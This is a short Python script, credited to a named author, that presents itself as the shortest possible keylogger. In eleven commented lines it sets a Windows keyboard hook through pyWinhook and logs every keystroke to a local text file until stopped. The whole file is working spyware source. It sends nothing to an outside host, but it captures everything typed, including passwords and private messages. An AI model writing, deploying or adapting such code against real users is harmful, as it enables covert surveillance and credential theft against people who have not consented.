#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# -----------------------------------------------------------------------------------------------------------
# Name:         tinykeylogger01.py
# Purpose:      Shortest example of keylogger in Python. Exactly eleven lines of pure code.
# Author:       Gabriel Marti Fuentes
# email:        gabimarti at gmail dot com
# GitHub:       https://github.com/gabimarti
# Created:      17/08/2019
# License:      GPLv3
# -----------------------------------------------------------------------------------------------------------

import pyWinhook as pyHook, pythoncom, logging      # 1 - imports


def on_keyboard_event(event):                       # 2 - Event that record keystrokes
    logging.debug(chr(event.Ascii))                 # 3 - Save keystroke on file
    return True                                     # 4 - Must return true for proper operation


file_keylog = 'tinykeylogger01.txt'                 # 5 - Filename where keystrokes are recorded
logging.StreamHandler.terminator = ''               # 6 - Avoids CRLF after every keystroke recorded
logging.basicConfig(filename=file_keylog, level=logging.DEBUG, format='%(message)s')  # 7 - Sets logging
hooks_manager = pyHook.HookManager()                # 8 - Creates new hook manager
hooks_manager.KeyDown = on_keyboard_event           # 9 - Register event callbacks
hooks_manager.HookKeyboard()                        # 10 - Sets hook for Keyboard
pythoncom.PumpMessages()                            # 11 - Wait indefinitely

